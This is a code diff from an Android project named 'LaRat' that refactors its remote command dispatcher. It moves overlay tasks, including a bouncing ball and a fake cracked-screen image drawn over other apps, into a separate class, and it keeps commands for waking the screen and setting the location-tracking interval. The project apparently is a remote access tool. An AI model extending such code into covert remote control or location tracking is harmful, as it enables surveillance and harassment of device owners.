@@ -1,6 +1,7 @@
 package com.c4wd.command;
 
 import android.content.Context;
+import android.content.Intent;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.graphics.PixelFormat;
@@ -13,6 +14,7 @@ import android.widget.ImageView;
 import android.widget.Toast;
 
 import com.c4wd.larat.LaRatLocationManager;
+import com.c4wd.larat.LaRatService;
 import com.c4wd.larat.R;
 import com.larat.drawing.BouncingBall;;
 import java.security.acl.LastOwnerException;
@@ -35,9 +37,9 @@ public class Command {
         commandList.put("ScreenOn", new ScreenOnTask());
         commandList.put("SetLocationInterval", new SetLocationIntervalTask());
         commandList.put("Toast", new ToastTask());
-        commandList.put("OpenGL", new OpenGLViewTask());
-        commandList.put("Pong", new OpenGLViewTask());
-        commandList.put("ScreenCrack", new CrackScreenTask());
+        commandList.put("OpenGL", new DrawingTasks.OpenGLViewTask());
+        commandList.put("Pong", new DrawingTasks.PongTask());
+        commandList.put("ScreenCrack", new DrawingTasks.CrackScreenTask());
     }
 
     public static class ScreenOnTask extends AsyncTask<Object, Void, String> {
@@ -86,117 +88,5 @@ public class Command {
             LaRatLocationManager.startLocationService(context.getContext());
             return null;
         }
-    }
-
-    public static class OpenGLViewTask extends AsyncTask<Object, Void, Void> {
-
-        private CommandContext context;
-
-        @Override
-        protected Void doInBackground(Object... objects) {
-            this.context = (CommandContext)(objects[0]);
-            return null;
-        }
-
-        @Override
-        protected void onPostExecute(Void returnValue) {
-            WindowManager windowManager = (WindowManager) this.context.getContext().getSystemService(Context.WINDOW_SERVICE);
-
-            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
-                    WindowManager.LayoutParams.WRAP_CONTENT,
-                    WindowManager.LayoutParams.WRAP_CONTENT,
-                    WindowManager.LayoutParams.TYPE_PHONE,
-                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
-                    PixelFormat.TRANSLUCENT);
-
-            params.gravity = Gravity.FILL;
-            params.x = 0;
-            params.y = 0;
-
-            /*GLSurfaceView view = new GLSurfaceView(context.getContext());
-            view.setRenderer(new OpenGLRenderer());
-            ViewGroup.LayoutParams layoutParams = new ViewGroup.LayoutParams(80, 80);
-            view.setLayoutParams(layoutParams);*/
-
-            /*ImageView view = new ImageView(context.getContext());
-            view.setLayoutParams(new ViewGroup.LayoutParams(100, 100));
-            view.setImageBitmap();*/
-
-            BouncingBall view = new BouncingBall(context.getContext());
-            view.maxX = windowManager.getDefaultDisplay().getWidth();
-            view.maxY = windowManager.getDefaultDisplay().getHeight();
-
-            windowManager.addView(view, params);
-        }
-
-    }
-
-    public static class PongTask extends AsyncTask<Object, Void, Void> {
-
-        private CommandContext context;
-
-        @Override
-        protected Void doInBackground(Object... objects) {
-            this.context = (CommandContext)(objects[0]);
-            return null;
-        }
-
-        @Override
-        protected void onPostExecute(Void returnValue) {
-            WindowManager windowManager = (WindowManager) this.context.getContext().getSystemService(Context.WINDOW_SERVICE);
-
-            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
-                    WindowManager.LayoutParams.WRAP_CONTENT,
-                    WindowManager.LayoutParams.WRAP_CONTENT,
-                    WindowManager.LayoutParams.TYPE_PHONE,
-                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
-                    PixelFormat.TRANSLUCENT);
-
-            params.gravity = Gravity.FILL;
-            params.x = 0;
-            params.y = 0;
-
-            BouncingBall view = new BouncingBall(context.getContext());
-            view.maxX = windowManager.getDefaultDisplay().getWidth();
-            view.maxY = windowManager.getDefaultDisplay().getHeight();
-
-            windowManager.addView(view, params);
-        }
-
-    }
-
-    public static class CrackScreenTask extends AsyncTask<Object, Void, Void> {
-
-        private CommandContext context;
-
-        @Override
-        protected Void doInBackground(Object... objects) {
-            this.context = (CommandContext)(objects[0]);
-            return null;
-        }
-
-        @Override
-        protected void onPostExecute(Void returnValue) {
-            WindowManager windowManager = (WindowManager) this.context.getContext().getSystemService(Context.WINDOW_SERVICE);
-
-            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
-                    WindowManager.LayoutParams.WRAP_CONTENT,
-                    WindowManager.LayoutParams.WRAP_CONTENT,
-                    WindowManager.LayoutParams.TYPE_PHONE,
-                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
-                    PixelFormat.TRANSLUCENT);
-
-            params.gravity = Gravity.CENTER;
-            params.x = 0;
-            params.y = 0;
-
-            ImageView view = new ImageView(context.getContext());
-            Bitmap bm = BitmapFactory.decodeResource(context.getContext().getResources(), R.drawable.crack);
-            view.setImageBitmap(bm);
-            view.setLayoutParams(new ViewGroup.LayoutParams(100, 100));
-
-            windowManager.addView(view, params);
-        }
-
     }
 }
